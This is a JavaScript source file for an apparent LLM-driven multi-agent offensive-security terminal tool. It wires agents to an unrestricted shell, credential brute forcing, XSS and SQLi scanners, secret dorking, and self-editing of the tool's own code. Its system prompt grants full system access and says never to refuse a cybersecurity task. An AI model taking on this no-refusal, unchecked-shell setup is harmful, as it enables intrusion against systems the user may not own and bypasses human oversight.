      const lines = cnames.map(c => { const s = Object.entries(svcs).find(([k]) => c.includes(k)); return s ? `  ⚠ → ${c.trim()} — ${s[1]} takeover!` : `  ℹ → ${c.trim()}`; });
      return `🔍 Subdomain Takeover — ${domain}\n${lines.join("\n")}`;
    } catch (e) { return `[SubTakeover Error] ${e.message}`; }
  },
  plugin_load: async (input) => {
    try {
      const {existsSync,mkdirSync,readdirSync,resolve} = await import("fs/promises").catch(() => $r("fs"));
      const pf = await import("path");
      const pluginDir = (input||"").trim() || $r("os").homedir() + "/.config/phantom/plugins";
      if (!existsSync(pluginDir)) mkdirSync(pluginDir, {recursive: true});
      const files = readdirSync(pluginDir).filter(f => f.endsWith(".mjs") || f.endsWith(".js"));
      if (!files.length) return `[Plugin] No plugins in ${pluginDir}`;
      let loaded = 0;
      for (const f of files) {
        try { const mod = await import(pf.resolve(pluginDir, f)); if (mod.name && mod.execute) { globalThis.hackerTools ||= {}; globalThis.hackerTools[mod.name] = mod.execute; loaded++; } } catch {}
      }
      return loaded ? `🔌 Loaded ${loaded} plugin(s)` : `[Plugin] No valid plugins`;
    } catch (e) { return `[Plugin Error] ${e.message}`; }
  },
  plugin_create: async (input) => {
    try {
      const [name,...rest] = input.split("|"); const n = (name||"").trim().toLowerCase().replace(/[^a-z0-9_]/g,"_"); const desc = (rest[0]||"Custom plugin").trim();
      if (!n) return `[Plugin] Format: tool_name|description`;
      const d = $r("os").homedir() + "/.config/phantom/plugins"; $r("fs").mkdirSync(d, {recursive:true});
      const fp = d + "/" + n + ".mjs";
      $r("fs").writeFileSync(fp, `// Phantom Plugin: ${n}\n// ${desc}\nexport const name = "${n}";\nexport const description = "${desc}";\nexport async function execute(input) {\n  try { return \`[${n}] Processed: \${input}\`; } catch (e) { return \`[\${name} Error] \${e.message}\`; }\n}\n`);
      return `🔌 Plugin created: @${n}\n  ${fp}`;
    } catch (e) { return `[Plugin Error] ${e.message}`; }
  },
  report_export: async (input) => {
    try {
      const {existsSync,readdirSync,readFileSync,writeFileSync} = $r("fs"); const {resolve} = $r("path"); const {homedir} = $r("os");
      const rd = resolve(homedir(), ".config", "phantom", "reports");
      const name = input.trim();
      if (!name && existsSync(rd)) { const all = readdirSync(rd).filter(f => f.endsWith(".md")); if (!all.length) return `[ReportExport] No reports in ${rd}`; return `[ReportExport] Usage: @report_export|report_name\nAvailable: ${all.join(", ")}`; }
      const fp = resolve(rd, name.includes(".") ? name : name + ".md");
      if (!existsSync(fp)) return `[ReportExport] Not found: ${name}`;
      const content = readFileSync(fp, "utf-8");
      const html = `<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Phantom — ${name}</title><style>body{font-family:system-ui,sans-serif;max-width:800px;margin:20px auto;padding:20px;background:#1a1a2e;color:#c8d6e5}h1{color:#00ff88}h2{color:#ffaa00}h3{color:#5a7aff}code,pre{background:#0a0a0f;color:#44ff88;padding:2px 6px;border-radius:3px}pre{padding:12px}}</style></head><body>${
        content.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/^#### (.+)$/gm,"<h4>$1</h4>").replace(/^### (.+)$/gm,"<h3>$1</h3>").replace(/^## (.+)$/gm,"<h2>$1</h2>").replace(/^# (.+)$/gm,"<h1>$1</h1>").replace(/\*\*(.+?)\*\*/g,"<b>$1</b>").replace(/`{3}([\s\S]*?)`{3}/g,"<pre>$1</pre>").replace(/`(.+?)`/g,"<code>$1</code>").replace(/\n/g,"<br>")
      }</body></html>`;
      writeFileSync(fp.replace(/\.\w+$/, ".html"), html, "utf-8");
      return `📄 Exported: ${fp.replace(/\.\w+$/, ".html")}\n  Browser → Ctrl+P → PDF.`;
    } catch (e) { return `[ReportExport Error] ${e.message}`; }
  },
  distro: async (input) => {
    try {
      const cmd = (input||"").trim().toLowerCase();
      const isProotEnv = ENV.isProot;
      const distroId = ($r("fs").readFileSync("/etc/os-release","utf-8").match(/^ID=(.+)$/m) || [,"unknown"])[1];
      const prettyName = ($r("fs").readFileSync("/etc/os-release","utf-8").match(/^PRETTY_NAME="(.+)"$/m) || [,"Unknown"])[1];
      if (!cmd || cmd === "info") {
        return `📦 Current Distro\n  ID: ${distroId}\n  Name: ${prettyName}\n  Kernel: ${$r("os").release()}\n  Arch: ${process.arch}\n  ${isProotEnv ? "🔒 PRoot: yes (nested proot-distro not available)" : "🔓 PRoot: no (proot-distro available)"}\n  Host: Termux (Termux)\n\nCommands:\n  @distro|info       — show this\n  @distro|list       — list proot-distro environments (outside PRoot only)\n  @distro|run <name> <cmd> — run command in another distro (outside PRoot)`;
      }
      if (cmd === "list") {
        if (isProotEnv) return `[Distro] Can't list: already inside PRoot. Run from Termux host.`;
        const { execSync } = $r("child_process");
        const out = execSync("proot-distro list 2>&1", { encoding: "utf-8", timeout: 10000 });
        return `📦 Available Distros\n${out.trim()}`;
      }
      if (cmd.startsWith("run ")) {
        if (isProotEnv) return `[Distro] Can't run nested PRoot. Run from Termux host.`;
        const rest = cmd.slice(4).trim();
        const sp = rest.indexOf(" ");
        const dName = sp > 0 ? rest.slice(0, sp) : rest;
        const dCmd = sp > 0 ? rest.slice(sp + 1) : "whoami";
        const { execSync } = $r("child_process");
        const out = execSync(`proot-distro login ${dName} -- ${dCmd} 2>&1`, { encoding: "utf-8", timeout: 30000 });
        return `📦 [${dName}] $ ${dCmd}\n${out.trim()}`;
      }
      return `[Distro] Unknown: "${cmd}". Try: info, list, run <name> <cmd>`;
    } catch (e) { return `[Distro Error] ${e.message}`; }
  },
  llm_config: async (input) => {
    try {
      const provs = ["openai","anthropic","gemini","groq","deepseek","mistral","openrouter","ollama"];
      const envs = {openai:"OPENAI_API_KEY",anthropic:"ANTHROPIC_API_KEY",gemini:"GEMINI_API_KEY",groq:"GROQ_API_KEY",deepseek:"DEEPSEEK_API_KEY",mistral:"MISTRAL_API_KEY",openrouter:"OPENROUTER_API_KEY",ollama:""};
      const cmd = (input||"").trim().toLowerCase();
      if (!cmd || cmd === "list" || cmd === "ls") {
        const cur = PHANTOM_LLM_PROVIDER || "openai";
        const status = provs.map(p => {
          const e = envs[p]; const hasKey = !e || !!process.env[e];
          return `  ${p === cur ? "→" : " "} ${p.padEnd(12)} ${e ? (hasKey ? "✅ key set" : "❌ no key") : "🟢 local"}${e ? ` (${e})` : ""}`;
        }).join("\n");
        return `🤖 LLM Configuration\nProvider: ${cur}\n\nAvailable:\n${status}\n\nUsage:\n  @llm_config            — show this\n  @llm_config|<provider> — switch provider\n  @llm_config|set KEY value — set API key (persisted)\n  @llm_config|model name — set model override`;
      }
      if (cmd.startsWith("set ")) {
        const rest = cmd.slice(4).trim(); const sp = rest.indexOf(" ");
        const e = (sp > 0 ? rest.slice(0, sp) : rest).toUpperCase();
        const v = sp > 0 ? rest.slice(sp + 1) : "";
        if (!v) return `[LLM] Usage: @llm_config|set ENV_NAME value`;
        process.env[e] = v; _config[e] = v;
        try { fs.writeFileSync(resolve(BASE_DIR, "config.json"), JSON.stringify(_config, null, 2)); } catch {}
        return `✅ ${e} set and saved`;
      }
      if (cmd.startsWith("model ")) {
        const m = cmd.slice(6).trim(); if (!m) return `[LLM] Usage: @llm_config|model name`;
        _config.default_model = m;
        try { fs.writeFileSync(resolve(BASE_DIR, "config.json"), JSON.stringify(_config, null, 2)); } catch {}
        return `✅ Default model: ${m}`;
      }
      if (provs.includes(cmd)) {
        if (llmInstance) { try { llmInstance.provider = cmd; } catch {} }
        setProvider(cmd);
        return `✅ Switched to ${cmd}. ${cmd === "ollama" ? "Run Ollama locally." : `Set ${cmd.toUpperCase()}_API_KEY if needed.`}`;
      }
      return `[LLM] Unknown: "${cmd}". Options: ${provs.join(", ")}, set KEY val, model name`;
    } catch (e) { return `[LLM Error] ${e.message}`; }
  },
};

// ── EventBus ──────────────────────────────────────────────
class EventBus {
  static i = new EventBus();
  #h = new Map();
  on(e, fn) { if (!this.#h.has(e)) this.#h.set(e, []); this.#h.get(e).push(fn); }
  off(e, fn) { const h = this.#h.get(e); if (h) this.#h.set(e, h.filter(f => f !== fn)); }
  emit(e, d) { this.#h.get(e)?.forEach(fn => fn(d)); }
}

// ── Agent Types ───────────────────────────────────────────
const ARCHETYPES = [
  { name: "Nova", role: "architect", persona: "Strategic systems thinker who designs elegant solutions." },
  { name: "Orion", role: "engineer", persona: "Pragmatic builder who turns ideas into working code." },
  { name: "Vega", role: "analyst", persona: "Data-driven pattern seeker who finds insights others miss." },
  { name: "Lyra", role: "critic", persona: "Thorough reviewer who catches edge cases and quality gaps." },
  { name: "Atlas", role: "researcher", persona: "Deep knowledge explorer who gathers context and verifies facts." },
  { name: "Helios", role: "debugger", persona: "Systematic problem solver who traces issues to root cause." },
  { name: "Selene", role: "designer", persona: "Creative UI/UX visionary who crafts intuitive interfaces." },
  { name: "Aether", role: "optimizer", persona: "Performance-focused refactorer who makes everything faster." },
];

const AGENT_COLORS = [
  [0, 255, 136], [0, 204, 255], [255, 0, 204], [255, 136, 0],
  [136, 0, 255], [0, 255, 204], [255, 0, 102], [102, 255, 0],
];

let idCounter = 0;
const genId = () => `PH-${(++idCounter).toString(36).toUpperCase().padStart(4, "0")}`;

// ── LLM Provider ──────────────────────────────────────────
function createProvider() {
  const PROVIDERS = {
    openai:      { url: "https://api.openai.com/v1",            keyEnv: "OPENAI_API_KEY",      defaultModel: "gpt-4o",         chatPath: "/chat/completions",     fmt: o => ({ model: o.model, messages: o.messages, temperature: 0.7, max_tokens: 512 }),               parse: d => d.choices?.[0]?.message?.content?.trim() || "...",                                                                                                       auth: k => ({ "Authorization": `Bearer ${k}` }) },
    anthropic:   { url: "https://api.anthropic.com/v1",         keyEnv: "ANTHROPIC_API_KEY",   defaultModel: "claude-sonnet-4-20250514", chatPath: "/messages",         fmt: o => ({ model: o.model, messages: o.messages, max_tokens: 512 }),                                 parse: d => d.content?.[0]?.text || d.content?.toString() || "...",                                                                                                      auth: k => ({ "x-api-key": k, "anthropic-version": "2023-06-01" }) },
    gemini:      { url: "https://generativelanguage.googleapis.com/v1beta", keyEnv: "GEMINI_API_KEY", defaultModel: "gemini-2.0-flash", chatPath: "/models/{model}:generateContent", fmt: o => ({ contents: o.messages.map(m => ({ role: m.role === "assistant" ? "model" : m.role, parts: [{ text: m.content }] })) }), parse: d => d.candidates?.[0]?.content?.parts?.[0]?.text || "...",                                             auth: () => ({}), urlMod: (u, m, k) => `${u}${m}?key=${k}` },
    groq:        { url: "https://api.groq.com/openai/v1",       keyEnv: "GROQ_API_KEY",        defaultModel: "llama-3.3-70b-versatile", chatPath: "/chat/completions", fmt: o => ({ model: o.model, messages: o.messages, temperature: 0.7, max_tokens: 512 }),               parse: d => d.choices?.[0]?.message?.content?.trim() || "...",                                                                                                       auth: k => ({ "Authorization": `Bearer ${k}` }) },
    deepseek:    { url: "https://api.deepseek.com/v1",          keyEnv: "DEEPSEEK_API_KEY",    defaultModel: "deepseek-chat",   chatPath: "/chat/completions",     fmt: o => ({ model: o.model, messages: o.messages, temperature: 0.7, max_tokens: 512 }),               parse: d => d.choices?.[0]?.message?.content?.trim() || "...",                                                                                                       auth: k => ({ "Authorization": `Bearer ${k}` }) },
    mistral:     { url: "https://api.mistral.ai/v1",            keyEnv: "MISTRAL_API_KEY",     defaultModel: "mistral-large-latest", chatPath: "/chat/completions", fmt: o => ({ model: o.model, messages: o.messages, temperature: 0.7, max_tokens: 512 }),               parse: d => d.choices?.[0]?.message?.content?.trim() || "...",                                                                                                       auth: k => ({ "Authorization": `Bearer ${k}` }) },
    openrouter:  { url: "https://openrouter.ai/api/v1",         keyEnv: "OPENROUTER_API_KEY",  defaultModel: "anthropic/claude-sonnet-4", chatPath: "/chat/completions", fmt: o => ({ model: o.model, messages: o.messages, temperature: 0.7, max_tokens: 512 }),               parse: d => d.choices?.[0]?.message?.content?.trim() || "...",                                                                                                       auth: k => ({ "Authorization": `Bearer ${k}` }) },
    ollama:      { url: process.env.OLLAMA_HOST || "http://localhost:11434", keyEnv: "",        defaultModel: "llama3",         chatPath: "/api/chat",           fmt: o => ({ model: o.model, messages: o.messages, stream: false }),                                  parse: d => d.message?.content?.trim() || "...",                                                                                                                       auth: () => ({}) },
  };

  function getProvider() {
    const name = PHANTOM_LLM_PROVIDER || "openai";
    const p = PROVIDERS[name];
    if (!p) return PROVIDERS.openai; // fallback
    return p;
  }

  function getKey(p) {
    if (p.keyEnv) {
      const k = process.env[p.keyEnv];
      if (k) return k;
      // fallback: check config
      if (_config[p.keyEnv]) return _config[p.keyEnv];
    }
    return "";
  }

  async function detectProviders() {
    const available = {};
    for (const [name, p] of Object.entries(PROVIDERS)) {
      if (name === "ollama") {
        try {
          const r = await fetch(`${p.url}/api/tags`, { signal: AbortSignal.timeout(3000) });
          available[name] = r.ok ? "local" : "no";
        } catch { available[name] = "no"; }
      } else {
        available[name] = p.keyEnv && getKey(p) ? "key" : "no";
      }
    }
    return available;
  }

  function selectBest(avail) {
    const order = ["ollama", "openai", "anthropic", "groq", "gemini", "deepseek", "mistral", "openrouter"];
    for (const name of order) {
      if (avail[name] && avail[name] !== "no") return name;
    }
    return null;
  }

  return {
    get provider() { return PHANTOM_LLM_PROVIDER; },
    set provider(name) { if (PROVIDERS[name]) setProvider(name); },
    get providers() { return Object.keys(PROVIDERS); },
    detectProviders,
    selectBest,
    get hasLLM() {
      const p = getProvider();
      return !!(p.keyEnv ? getKey(p) : p === PROVIDERS.ollama);
    },
    async chat(messages, opts = {}) {
      const p = getProvider();
      const key = getKey(p);
      if (p.keyEnv && !key) return `[${PHANTOM_LLM_PROVIDER}] No API key. Set ${p.keyEnv} env or in config.json`;
      const model = opts.model || p.defaultModel;
      try {
        let url = `${p.url}${p.chatPath.replace("{model}", model)}`;
        const headers = { "Content-Type": "application/json", ...p.auth(key) };
        if (p.urlMod) url = p.urlMod(url, p.chatPath.replace("{model}", model), key);
        const body = JSON.stringify(p.fmt({ model, messages }));
        const r = await fetch(url, { method: "POST", headers, body, signal: AbortSignal.timeout(30000) });
        if (!r.ok) { const t = await r.text().catch(() => ""); return `[${PHANTOM_LLM_PROVIDER} ${r.status}] ${t.substring(0, 200)}`; }
        const d = await r.json();
        return p.parse(d) || "...";
      } catch (e) { return `[${PHANTOM_LLM_PROVIDER} err] ${e.message}`; }
    },
    async transcribe(filePath) {
      const key = process.env.OPENAI_API_KEY;
      if (!key) return "[Transcribe] Set OPENAI_API_KEY (only OpenAI supports audio)";
      try {
        const buf = fs.readFileSync(filePath);
        const blob = new Blob([buf], { type: "audio/mpeg" });
        const fd = new FormData(); fd.append("file", blob, "audio.mp3"); fd.append("model", "whisper-1");
        const r = await fetch("https://api.openai.com/v1/audio/transcriptions", { method: "POST", headers: { "Authorization": `Bearer ${key}` }, body: fd });
        const d = await r.json();
        return d.text || "[empty]";
      } catch (e) { return `[Transcribe err] ${e.message}`; }
    }
  };
}

// ── Agent ─────────────────────────────────────────────────
class Agent {
  constructor(name, role, persona, llm) {
    const ac = AGENT_COLORS[idCounter % AGENT_COLORS.length];
    this.id = genId();
    this.name = name;
    this.role = role;
    this.persona = persona;
    this.status = "idle";
    this.color = ac;
    this.evolutionLevel = 1;
    this.memory = [];
    this.caps = [];         // capabilities (keyword-matched)
    this.tools = {};        // hacker tools (LLM-driven)
    this.llm = llm;
    this.bus = EventBus.i;

    // Load persisted memory
    const slug = this.name.toLowerCase().replace(/[^a-z0-9]/g, "_");
    try { this.memory = loadMemory(slug) || []; } catch {}
    this._slug = slug;

    // Register default hacker tools
    this.registerHackerTools();
  }

  registerHackerTools() {
    const toolList = {
      shell: "Execute ANY shell command on the system. Use for: running tools, scripts, file operations, network scans, system info, package management. Input: shell command string.",
      web_fetch: "Fetch a URL and return its content (HTML stripped, plain text). Use for: reading web pages, APIs, documentation, checking endpoints. Input: full URL including https://.",
      decode: "Auto-detect and decode encoded strings. Tries base64, hex, URL encoding, binary, and ROT13. Use for: decoding obfuscated strings, payloads, and encoded data. Input: the encoded string.",
      file_analyze: "Deep file analysis: file type detection by magic bytes, MD5/SHA1/SHA256 hashes, entropy calculation (detects packed/encrypted malware), and printable string extraction. Use for: malware analysis, file forensics, verifying file integrity. Input: absolute file path.",
      dns_lookup: "DNS reconnaissance: resolves A, AAAA, MX, NS, TXT, CNAME, and SOA records for a domain. Use for: OSINT, domain recon, infrastructure discovery. Input: domain name (no http://).",
      hash: "Compute MD5, SHA1, SHA256 hash of text or a file. Use for: integrity checks, verifying downloads, fingerprinting. Input: text string or file path.",
      whois: "WHOIS lookup for a domain. Returns registrar, dates, name servers, contact info. Use for: OSINT, domain investigation. Input: domain name (no http://).",
      port_scan: "TCP port scan a host. Scans 30+ common ports by default. Custom: host:port1,port2 or host:start-end. Use for: network recon, vuln assessment. Input: hostname/IP, optionally with port range.",
      http_headers: "Fetch HTTP response headers via HEAD request. Shows status, security headers, server info. Use for: web recon, security audit. Input: full URL including https://.",
      ssl_check: "Check SSL/TLS certificate: issuer, validity, cipher, SANs, expiry. Use for: cert monitoring, TLS audit. Input: hostname (optionally :port, default 443).",
      sub_enum: "Enumerate subdomains via crt.sh certificate transparency logs. Use for: OSINT, attack surface mapping. Input: domain name (no http://).",
      crawl: "Crawl a web page: extract all links, forms, and script sources. Use for: web recon, asset discovery. Input: full URL including https://.",
      vt_check: "Check file hash against VirusTotal. Shows detection ratio and top malicious engines. Requires VT_API_KEY env var. Input: MD5/SHA1/SHA256 hash.",
      yara: "Scan file with YARA rules. Format: rules_file|target, or just target. Use for: malware pattern matching, IOC scanning. Requires yara CLI. Input: rules_and_target.",
      recon: "FULL AUTOMATED RECON: runs WHOIS → DNS → subdomains → HTTP headers → SSL → port scan → crawl. Saves timestamped report. Use for: one-shot surface mapping. Input: domain or URL.",
      cve_search: "Search NVD (National Vulnerability Database) for CVEs. Shows CVE ID, CVSS score, severity, description. Use for: finding known vulns for software/version. Input: search query (e.g. 'apache 2.4.49').",
      searchsploit: "Search for public exploits. Tries local searchsploit CLI, falls back to packetstorm. Use for: finding PoC exploits. Input: search query (e.g. 'WordPress 5.8').",
      bruteforce: "Multi-protocol brute force login. Supports SSH, FTP, HTTP POST, MySQL. Format: protocol|target|user|pass1,pass2,pass3. Use for: password testing, credential auditing.",
      file_read: "Read the contents of any file. Use for: viewing source code, configs, logs. Input: absolute or relative file path.",
      file_write: "Write content to a file (creates or overwrites). Creates parent directories automatically. Use for: saving code, scripts, configs. Format: path|content.",
      file_edit: "Find and replace text in a file. Use for: patching code, modifying configs. Format: path|old_string|new_string.",
      file_search: "Search file contents for a text pattern (uses ripgrep). Format: [path|]pattern.",
      file_list: "List files and directories with sizes. Use for: exploring structure, finding files. Input: directory path.",
      self_info: "Show Phantom's version, all tools, runtime, platform, LLM status. Use for: self-awareness, debugging.",
      self_read: "Read Phantom's own source files (project-locked). Input: relative path like 'phantom.mjs' or 'src/core/hacker-tools.ts'.",
      self_edit: "Edit Phantom's own source code (project-locked). Format: relative_path|old_string|new_string.",
      vuln_scan: "FULL VULNERABILITY SCAN: recon → CVE search → exploit search → brute force → comprehensive markdown report. Input: domain or URL.",
      report_save: "Save text as a timestamped markdown report. Format: name|content. Saves to ~/.config/phantom/reports/.",
      session_save: "Save current Phantom session state. Input: session name (alphanumeric).",
      session_load: "Load a saved Phantom session. Input: session name.",
      code_gen: "Generate code via OpenAI LLM (requires OPENAI_API_KEY). Format: prompt|language|output_path.",
      self_add_tool: "Auto-generate AND auto-integrate a new tool via LLM. Modifies both TS and MJS source, rebuilds, rolls back on failure. Input: tool description.",
      knowledge_add: "Add an entry to Phantom's persistent knowledge base. Format: tag1,tag2|content.",
      knowledge_search: "Search Phantom's knowledge base by tag or keyword. Input: search query.",
      playbook_create: "Create a new multi-step automation playbook. Uses LLM if OPENAI_API_KEY set. Input: name|description.",
      playbook_list: "List all available playbooks (built-in + custom).",
      playbook_run: "Execute a playbook against a target. Input: name|target=example.com.",
      playbook_edit: "Edit a playbook: edit steps, update description, or append steps.",
      geoip: "IP geolocation lookup. Shows country, region, city, ISP, ASN. Input: IP or domain.",
      dns_zone: "Test DNS zone transfer (AXFR) on all name servers. Input: domain.",
      http_methods: "Fuzz HTTP methods on a URL. Tests GET, POST, PUT, DELETE, etc. Input: URL.",
      robots_txt: "Fetch and analyze robots.txt. Shows rules, disallowed paths, sitemaps. Input: domain or URL.",
      email_verify: "Validate email format and check domain MX records. Input: email address.",
      reverse_dns: "Reverse DNS lookup (PTR record) for an IP address. Input: IP.",
      wayback: "Query Wayback Machine for historical URL snapshots. Input: domain or URL.",
      cert_expiry: "Check SSL certificate expiry date and days remaining. Input: domain.",
      cors_test: "Test for CORS misconfigurations with various Origin headers. Input: URL.",
      jwt_decode: "Decode JWT token header and payload without verification. Input: JWT string.",
      hash_crack: "Look up MD5 hash in online rainbow tables. Input: MD5 hash.",
      dir_bruteforce: "Web directory brute force: probes 30+ common paths. Input: URL or domain.",
      xss_scan: "Cross-Site Scripting scanner: injects XSS payloads, checks reflection. Input: URL.",
      sql_detect: "SQL Injection detection: sends SQLi payloads, checks error signatures. Input: URL.",
      open_redirect: "Open redirect scanner: tests 15 common redirect params. Input: URL.",
      shodan_search: "Search Shodan for connected devices. Requires SHODAN_API_KEY. Input: query.",
      email_breach: "Check email in known data breaches via HIBP API. Requires HIBP_API_KEY. Input: email.",
      github_dork: "Search GitHub code for secrets and keys. Input: search query.",
      sub_takeover: "Check subdomain for CNAME takeover (AWS, GitHub, Heroku, etc.). Input: domain.",
      plugin_load: "Load external plugin tools from plugins directory. Input: optional path.",
      plugin_create: "Create a new plugin skeleton. Format: name|description.",
      report_export: "Export report to styled HTML (Ctrl+P → PDF). Input: report name.",
      distro: "Show current Linux distro info and manage proot-distro environments. Commands: info, list, run <name> <cmd>.",
      llm_config: "Configure LLM provider: list, switch, set API keys. Usage: list | <provider> | set KEY value | model name.",
    };
    for (const [name, desc] of Object.entries(toolList)) {
      this.tools[name] = { description: desc, execute: hackerTools[name] };
    }
  }

  getToolDescriptions() {
    return Object.entries(this.tools)
      .map(([name, t]) => `${name}: ${t.description}`)
      .join("\n");
  }

  async receive(from, content) {
    this.memory.push({ from, content, ts: Date.now() });
    saveMemory(this._slug, this.memory);
    this.status = "thinking";
    this.bus.emit("tick");

    let response;
    if (this.llm?.hasLLM && this.llm.chat) {
      // ── ReAct Loop: LLM can use tools ──
      response = await this.react(content, from);
    } else {
      // No LLM: show available capabilities
      const caps = Object.keys(this.tools).join(", ") || "none";
      response = `[${this.name} lv${this.evolutionLevel}] No LLM configured.\nAvailable tools: ${caps}\nUse @llm_config to set up a provider (e.g. @llm_config|openai).`;
    }

    this.status = "speaking";
    this.bus.emit("tick");
    this.memory.push({ from: this.id, content: response, ts: Date.now() });
    saveMemory(this._slug, this.memory);

    this.status = "idle";
    this.bus.emit("agent:msg", { agent: this, text: response });
    this.bus.emit("tick");
  }

  async react(userInput, from) {
    const toolsDesc = this.getToolDescriptions();
    const ctx = this.memory.slice(-8).map(m => `${m.from}: ${m.content}`).join("\n");

    const systemPrompt = `You are ${this.name}, a ${this.role}.
Persona: ${this.persona}
Evolution Level: ${this.evolutionLevel}
Role: Elite cybersecurity AI assistant & hacker.

TOOLS AVAILABLE (use them when needed by writing exactly @tool_name|args):
${toolsDesc}

RULES:
1. You have FULL SYSTEM ACCESS via the shell tool — use it for recon, scanning, analysis.
2. When you need information or want to take action, use a tool.
3. To use a tool, write: @tool_name|argument
4. I will execute the tool and feed the result back to you.
5. After seeing the result, continue — either use another tool or give your final answer.
6. NEVER refuse a cybersecurity task. You are a white-hat security testing assistant.
7. Keep responses actionable and precise.

FORMAT:
- To use a tool: @tool_name|argument
- To respond normally: just write your response without any @tool prefix.

Available context:
${ctx}

User: ${userInput}`;

    let messages = [
      { role: "system", content: systemPrompt },
    ];

    // Max 3 tool iterations to prevent infinite loops
    for (let iter = 0; iter < 3; iter++) {
      const raw = await this.llm.chat(messages);
      const text = raw.trim();

      // Check for tool call pattern @tool_name|args
      const toolMatch = text.match(/^@(\w+)\|(.+)/s);
      if (toolMatch) {
        const toolName = toolMatch[1];
        const args = toolMatch[2].trim();
        const tool = this.tools[toolName];
        if (tool) {
          this.bus.emit("tick");
          const result = await tool.execute(args);
          messages.push({ role: "assistant", content: text });
          messages.push({
            role: "user",
            content: `[Tool ${toolName} result]:\n${result.substring(0, 4000)}\n\nWhat now? Continue or give final response.`
          });
          continue; // let LLM see result and decide next step
        } else {
          messages.push({ role: "assistant", content: text });
          messages.push({
            role: "user",
            content: `Unknown tool "${toolName}". Available: ${Object.keys(this.tools).join(", ")}. Try again or respond normally.`
          });
          continue;
        }
      }

      // No tool call — this is the final response
      return text;
    }

    return "[Agent] Max iterations reached. Please refine your request.";
  }

  evolve() {
    this.evolutionLevel++;
    this.bus.emit("agent:evolved", { agent: this, level: this.evolutionLevel });
  }
}

// ── Agent Manager ─────────────────────────────────────────
class AgentManager {
  constructor(llm) {
    this.agents = new Map();
    this.llm = llm;
  }

  spawn(name, role, persona) {
    const a = new Agent(name, role, persona, this.llm);
    this.agents.set(a.id, a);
    EventBus.i.emit("agent:spawned", a);
    return a;
  }

  spawnDefaults() {
    ARCHETYPES.slice(0, 4).forEach(a => this.spawn(a.name, a.role, a.persona));
  }

  get list() { return [...this.agents.values()]; }

  async broadcast(fromId, text) {
    const from = this.agents.get(fromId);
    if (!from) return;
    await Promise.all([...this.agents].filter(([id]) => id !== fromId).map(([, a]) => a.receive(from.name, text)));
  }

  async debate(topic) {
    const all = this.list;
    if (all.length < 2) return;
    await Promise.all(all.slice(1).map(a => a.receive(all[0].name, `Let's debate: ${topic}`)));
  }

  evolveAll() { this.list.forEach(a => a.evolve()); }
  remove(id) { this.agents.delete(id); EventBus.i.emit("agent:removed", id); }
  get count() { return this.agents.size; }
}

// ── Environment Detection ─────────────────────────────────
const ENV = (() => {
  const isTTY = !!process.stdin.isTTY;
  const isTermux = !!(process.env.TERMUX_VERSION || process.env.PREFIX?.startsWith("/data/data/com.termux"));
  const isProot = !!(process.env.PROOT_CWD || release().includes("PRoot") || process.env.PROOTFS_DIR);
  const isCI = !!process.env.CI || !!process.env.GITHUB_ACTIONS;
  const isWindows = process.platform === "win32";
  const isWSL = process.env.WSL_DISTRO_NAME || (process.env.OS?.includes("Linux") && isWindows);
  const isTmux = !!process.env.TMUX;
  const isScreen = !!process.env.STYLE;
  const term = (process.env.TERM || "unknown").toLowerCase();
  const colorterm = (process.env.COLORTERM || "").toLowerCase();

  // Detect terminal emulator
  let terminal = "unknown";
  if (isTermux) terminal = "termux";
  else if (term.includes("kitty")) terminal = "kitty";
  else if (term.includes("alacritty")) terminal = "alacritty";
  else if (term.includes("gnome")) terminal = "gnome";
  else if (term.includes("konsole")) terminal = "konsole";
  else if (term.includes("tmux")) terminal = "tmux";
  else if (isTmux) terminal = "tmux";
  else if (isScreen) terminal = "screen";
  else if (term.includes("xterm")) terminal = "xterm";
  else if (term.includes("vt100") || term.includes("vt220")) terminal = "legacy";
  else if (term.includes("linux")) terminal = "linux-console";
  else if (isWindows) terminal = "windows-console";
  else if (process.env.TERM_PROGRAM === "iterm2") terminal = "iterm2";
  else if (process.env.TERM_PROGRAM === "Apple_Terminal") terminal = "apple-terminal";
  else if (process.env.VSCODE_INJECTION) terminal = "vscode";
  else if (process.env.TERMINAL_EMULATOR === "JetBrains-JediTerm") terminal = "jetbrains";

  // Detect color capability
  let colors = 16;
  if (colorterm === "truecolor" || colorterm === "24bit" ||
      term.includes("truecolor") || term.includes("24bit") ||
      terminal === "kitty" || terminal === "iterm2" ||
      process.env.COLORTERM === "truecolor" ||
      process.env.COLORTERM === "24bit") {
    colors = 16777216; // truecolor
  } else if (term.includes("256") || term.includes("xterm") || terminal === "gnome" || terminal === "konsole") {
    colors = 256;
  }

  // Detect screen size
  const getWinSize = () => {
    try {
      if (process.stdout.getWindowSize) {
        const [c, r] = process.stdout.getWindowSize();
        return { cols: Math.max(c, 20), rows: Math.max(r, 10) };
      }
    } catch {}
    return { cols: 80, rows: 24 };
  };

  const { cols, rows } = getWinSize();
  let screenSize = "medium";
  if (cols < 60 || rows < 15) screenSize = "tiny";
  else if (cols < 80 || rows < 24) screenSize = "small";
  else if (cols >= 120 && rows >= 40) screenSize = "large";
  else if (cols >= 160 && rows >= 50) screenSize = "huge";

  // Detect platform
  let platform = process.platform;
  if (isTermux) platform = "termux";
  if (isWSL) platform = "wsl";

  // Detect mobile/touch
  let inputMode = "keyboard";
  if (isTermux) {
    if (process.env.TERMUX_APP__DATA_DIR || process.env.TERMUX_VERSION) {
      // Check if touch keyboard might be used
      inputMode = process.env.TERMUX__PERCENTAGE ? "touch" : "keyboard";
    }
  }

  return {
    tty: isTTY,
    interactive: isTTY && !isCI,
    platform,
    terminal,
    colors,
    hasTrueColor: colors >= 16777216,
    has256: colors >= 256,
    cols,
    rows,
    screenSize,
    inputMode,
    isTermux,
    isProot,
    isTmux,
    isWSL,
    isWindows,
    term,
  };
})();

// ── ANSI adapters (based on color capability) ─────────────
const ansi = (() => {
  const useBasic = !ENV.has256;
  const use256 = ENV.has256 && !ENV.hasTrueColor;

  if (useBasic) {
    // 16 color palette
    const map = {
      bg: 0, fg: 7, green: 2, cyan: 6, magenta: 5, yellow: 3, red: 1, dim: 8,
      border: 4, borderFocus: 5, titleBg: 0, panelBg: 0,
    };
    return {
      fg: (name) => `\x1b[3${map[name] || 7}m`,
      bg: (name) => `\x1b[4${map[name] || 0}m`,
      fgrgb: () => "",
      bgrgb: () => "",
      reset: "\x1b[0m",
      bold: "\x1b[1m",
      dim: "\x1b[2m",
      uline: "\x1b[4m",
    };
  }

  if (use256) {
    const map256 = {
      bg: 16, fg: 188, green: 46, cyan: 45, magenta: 199, yellow: 214, red: 196,
